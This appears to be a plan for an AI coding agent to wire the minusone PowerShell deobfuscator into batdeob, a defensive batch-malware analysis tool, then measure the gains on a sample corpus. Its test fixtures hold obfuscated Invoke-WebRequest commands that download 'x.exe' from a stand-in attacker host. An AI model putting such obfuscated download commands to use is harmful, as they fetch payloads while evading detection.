# batdeob Plan J — Integrate airbus-cert/minusone for PowerShell deobfuscation

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development.

**Goal:** Add `minusone` (tree-sitter-based PowerShell deobfuscator) as a Cargo dependency. Pipe each extracted ps1 payload through minusone BEFORE running our URL-extraction regexes. Add MIT-license attribution. Measure corpus impact.

**Prereq:** Plans A–I landed. 231 tests, v8 corpus has 709 Download traits, 100% success.

**Why minusone:** The investigation in Plan H + I cleared the easy paths to URLs. The remaining ~621 PS-bearing samples without Download traits use patterns that regex can't reliably handle: format strings (`'{0}{1}' -f 'h','t'`), string-indexing-join (`'ABCXYZ'[3,1,2] -join ''`), variable propagation through control flow, foreach-pipeline `[char]` casting. minusone handles all of these via a tree-sitter AST + 33-rule fixed-point engine.

**Attribution:** [minusone](https://github.com/airbus-cert/minusone), MIT License, Copyright (c) 2023 Sylvain Peyrefitte.

---

## Task 1: Add minusone dependency + wire into ps1_scan

**Files:**
- Modify: `rust/crates/batdeob-core/Cargo.toml`
- Modify: `rust/crates/batdeob-core/src/ps1_scan.rs`
- Modify: `rust/crates/batdeob-core/src/lib.rs` (tests)

- [ ] **Step 1: Inspect minusone's public API**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cargo search minusone 2>&1 | head -5
```

The agent that researched this reported the CLI uses `Engine::new()` + `engine.deobfuscate()`. Verify by reading the crate's docs. If the API differs, adapt.

```bash
# Look at the crate's docs page
curl -s https://docs.rs/minusone/latest/minusone/ 2>&1 | head -40 || true
```

If `docs.rs` is inaccessible, we'll have to discover the API by trial — add the dep, write a smoke test, iterate.

- [ ] **Step 2: Add the dependency**

In `rust/crates/batdeob-core/Cargo.toml`, add to `[dependencies]`:

```toml
minusone = "0.5"
```

- [ ] **Step 3: Verify it builds**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --package batdeob-core 2>&1 | tail -10
```

This pulls in tree-sitter + tree-sitter-powershell. If the build fails:
- Check if minusone has a different package name on crates.io
- Try `cargo search minusone` to find the exact name
- If the crate doesn't exist on crates.io, fall back to `[dependencies] minusone = { git = "https://github.com/airbus-cert/minusone" }`

REPORT if the build fails — don't silently skip the integration.

- [ ] **Step 4: Add a smoke test** to `lib.rs`:

```rust
#[cfg(test)]
mod minusone_smoke_tests {
    use crate::{analyze, Config};
    use crate::traits::Trait;
    use base64::Engine;

    fn encode_utf16(payload: &str) -> String {
        let utf16: Vec<u8> = payload.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
        base64::engine::general_purpose::STANDARD.encode(&utf16)
    }

    #[test]
    fn format_string_obfuscation_resolves_url() {
        // "{0}{1}{2}" -f "ht","tp://evil.example/","x.exe"
        let ps = r#"Invoke-WebRequest -Uri ("{0}{1}{2}" -f "ht","tp://evil.example/","x.exe") -OutFile c.exe"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("evil.example/x.exe")
        ));
        assert!(has, "FormatString not deobfuscated: {:?}", report.traits);
    }

    #[test]
    fn string_index_join_resolves_url() {
        // The string contains all letters of "https://x.com". The indices spell it out.
        // 'abcdefghijklmnopqrstuvwxyz./:'
        //  0123456789012345678901234567890
        //  Indexing for "https://x.com" — picking out: h(7), t(19), t(19), p(15), s(18), :(28), /(27), /(27), x(23), .(26), c(2), o(14), m(12)
        let ps = r#"Invoke-WebRequest -Uri (("abcdefghijklmnopqrstuvwxyz.:/")[7,19,19,15,18,28,27,27,23,26,2,14,12] -join '')"#;
        let script = format!("powershell -EncodedCommand {}\r\n", encode_utf16(ps));
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| matches!(t,
            Trait::Download { src, .. } if src.contains("https://x.com")
        ));
        assert!(has, "string-index-join not deobfuscated: {:?}", report.traits);
    }
}
```

- [ ] **Step 5: Wire minusone into `ps1_scan.rs`**

In `scan_ps1_payloads`, AFTER decoding the payload to text (UTF-16LE heuristic etc.) and BEFORE the existing `expand_obfuscation`:

```rust
// Try minusone first — full tree-sitter PS deobfuscation.
// Falls back to raw text on parse error so we never lose payloads.
let minusone_text = minusone_deobfuscate(&raw_text).unwrap_or_else(|| raw_text.clone());
let text = expand_obfuscation(&minusone_text);
```

Add a helper at module scope:

```rust
//! PowerShell payload post-processing.
//!
//! Uses [minusone](https://github.com/airbus-cert/minusone) (MIT © 2023
//! Sylvain Peyrefitte) for tree-sitter-based PS deobfuscation, then runs
//! batdeob's URL-extraction regexes over the simplified text.

fn minusone_deobfuscate(text: &str) -> Option<String> {
    // The exact minusone API needs verification on first build attempt.
    // The most likely shape (per the crate's CLI):
    //   let mut engine = minusone::engine::DeobfuscateEngine::from_powershell(text)?;
    //   engine.deobfuscate(None);
    //   Some(engine.lint())
    //
    // If that doesn't compile, inspect the crate's exports via:
    //   cargo doc --package minusone --open
    // OR
    //   grep -r 'pub fn' ~/.cargo/registry/src/*/minusone-*/src/
    // and adapt.

    let mut engine = minusone::engine::DeobfuscateEngine::from_powershell(text).ok()?;
    engine.deobfuscate(None).ok()?;
    Some(engine.lint())
}
```

If the actual minusone API is different, adapt this function. The contract: take a PS text, return Some(deobfuscated_text) or None on any error. NEVER panic.

- [ ] **Step 6: Verify**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo test --workspace 2>&1 | tail -15
```

Expected: 231 base + 2 new = 233 tests, including the two minusone smoke tests.

If the smoke tests fail because minusone doesn't decode these specific patterns (the rule set is comprehensive but maybe not these exact constructions), report which one and we'll fall back to a regex backstop.

- [ ] **Step 7: Clippy**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo clippy --workspace --all-targets -- -D warnings 2>&1 | tail -10
```

- [ ] **Step 8: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add rust/crates/batdeob-core/Cargo.toml rust/crates/batdeob-core/src/ rust/Cargo.lock
git commit -m "Add minusone (MIT) for tree-sitter PowerShell deobfuscation in ps1_scan"
```

---

## Task 2: README attribution + tightening

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Add an "Acknowledgments" section** to README.md

Append to the existing README (before the `## License` section):

```markdown
## Acknowledgments

batdeob's PowerShell deobfuscation pipeline uses [minusone](https://github.com/airbus-cert/minusone) — a tree-sitter-based PowerShell + JavaScript deobfuscator from Airbus CERT. minusone is MIT-licensed, Copyright (c) 2023 Sylvain Peyrefitte.

The synthetic Windows environment snapshot (`rust/crates/batdeob-core/data/win11.json`) was extracted from a Windows 11 25H2 Pro `install.wim` using the helper at `rust/tools/extract-from-wim/`. No registry data ships from Microsoft directly.
```

- [ ] **Step 2: Add a per-source-file comment in `ps1_scan.rs`** (if not already from Task 1):

Verify the module's top doc comment mentions minusone (added in Task 1 Step 5).

- [ ] **Step 3: Commit**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git add README.md
git commit -m "README: acknowledge minusone (MIT) for PowerShell deobfuscation"
```

---

## Task 3: Corpus v9 + measurement

**Files:** none modified; just running + reporting.

- [ ] **Step 1: Build release**

```bash
export PATH="$HOME/.cargo/bin:$PATH"
cd /home/coz/Downloads/batch_deobfuscator/rust && cargo build --release 2>&1 | tail -3
ls -la target/release/batdeob
```

- [ ] **Step 2: Re-run corpus v9** (using v8 driver as the template):

```bash
sed 's|corpus_results_v8|corpus_results_v9|g' /tmp/corpus_run_v8.sh > /tmp/corpus_run_v9.sh
chmod +x /tmp/corpus_run_v9.sh
mkdir -p /tmp/corpus_results_v9 && rm -rf /tmp/corpus_results_v9/* 2>/dev/null
timeout 1800 /tmp/corpus_run_v9.sh > /tmp/corpus_run_v9.log 2>&1
ls /tmp/corpus_results_v9/*.json | wc -l
```

If `/tmp/corpus_run_v8.sh` is missing, recreate from the standard template (analyze with `--timeout 5 --max-iterations 65536 --max-child-scripts 64 --max-depth 12 --max-output-bytes 4194304 --max-output-line-bytes 65536 --max-traits-per-kind 100`).

- [ ] **Step 3: Wall-time check**

Adding minusone tree-sitter parsing has SOME overhead per ps1 payload. Make sure the corpus run doesn't blow past acceptable bounds. Check the slowest 10 samples in v9:

```bash
python3 <<'PY'
import json, re
from pathlib import Path

# v9 index.jsonl uses bash bc — same .NNN parse trick as before, sidestep via per-file scan
slowest = []
for f in Path("/tmp/corpus_results_v9").glob("*.json"):
    # Wall time isn't in the .json file (only in index.jsonl). Approximate via os.stat
    # ... actually skip wall time; just count file size as a proxy for processing complexity.
    sz = f.stat().st_size
    slowest.append((sz, f.stem))
slowest.sort(reverse=True)
print("Top 10 v9 output sizes:")
for sz, sha in slowest[:10]:
    print(f"  {sz:>10}  {sha}")
PY
```

If any sample now takes > 12 seconds (the timeout), the driver will have left an empty .json. Check for empty outputs:

```bash
find /tmp/corpus_results_v9 -name '*.json' -size 0 | wc -l
```

Empty count should be 0. If non-zero, investigate which samples timed out.

- [ ] **Step 4: Compare v8 vs v9**

```bash
python3 <<'PY'
import json
from pathlib import Path
from collections import Counter

def stats(d):
    samples = {}
    for f in Path(d).glob("*.json"):
        if f.stat().st_size == 0: continue
        try: samples[f.stem] = json.load(open(f))
        except: pass
    return samples

v8 = stats("/tmp/corpus_results_v8")
v9 = stats("/tmp/corpus_results_v9")
common = set(v8) & set(v9)
print(f"v8={len(v8)}  v9={len(v9)}  common={len(common)}")

def counts(samples, keys):
    cnt = Counter()
    for k in keys:
        for t in samples[k].get("traits", []):
            cnt[t.get("kind","")] += 1
    return cnt

c8 = counts(v8, common)
c9 = counts(v9, common)
print(f"\nOn {len(common)} common samples:")
print(f"  {'Trait':30} {'v8':>8} {'v9':>8}  Δ")
for k in sorted(set(c8)|set(c9), key=lambda x: -max(c8[x], c9[x]))[:15]:
    delta = c9[k] - c8[k]
    sign = "+" if delta > 0 else ""
    print(f"    {k:28} {c8[k]:>8} {c9[k]:>8}  {sign}{delta}")

# Per-sample Download delta
gained = lost = 0; gain_total = 0
gain_examples = []
for k in common:
    d8 = sum(1 for t in v8[k].get("traits",[]) if t.get("kind")=="Download")
    d9 = sum(1 for t in v9[k].get("traits",[]) if t.get("kind")=="Download")
    if d9 > d8:
        gained += 1; gain_total += (d9 - d8)
        if len(gain_examples) < 5:
            urls = [t.get("src") for t in v9[k].get("traits",[]) if t.get("kind")=="Download"]
            gain_examples.append((k, d8, d9, urls[0] if urls else "(none)"))
    elif d8 > d9:
        lost += 1
print(f"\nDownload delta v8 → v9 (per sample):")
print(f"  samples_gained: {gained}  (total +{gain_total} new Downloads)")
print(f"  samples_lost: {lost}")
print(f"\nExample gains:")
for sha, d8, d9, url in gain_examples:
    print(f"  {sha}  {d8} → {d9}  e.g. {url[:80]}")
PY
```

- [ ] **Step 5: Commit a completion marker with the table**

```bash
cd /home/coz/Downloads/batch_deobfuscator
git commit --allow-empty -m "$(cat <<EOF
Plan J complete: v9 corpus with minusone integration

[paste v8 vs v9 stats + example gains]
EOF
)"
```

## Report

- v8 vs v9 trait deltas (full table)
- Per-sample Download gain count + total new URLs (target: +50 to +150 if minusone integration is clean)
- Any timed-out samples
- Final test count (target: 233)
- Wall-time difference (approximate by total corpus run time before vs after)
- Commit SHA

---

## Self-review

- **Spec coverage**: only adds a single integration layer (minusone) + attribution. No new traits, no new handlers.
- **Risk**: minusone's API may differ from my best-guess in Task 1 Step 5. The plan instructs the agent to verify the API + adapt. If the integration fundamentally doesn't work, report BLOCKED — don't fake it.
- **Risk 2**: tree-sitter adds ~3 MB to the binary size. Acceptable. Wall-time per ps1 payload may grow by 10-200ms; on the 1,416-sample corpus, that's at most a few minutes longer.

**Plan J complete.** Execute via `superpowers:subagent-driven-development`.
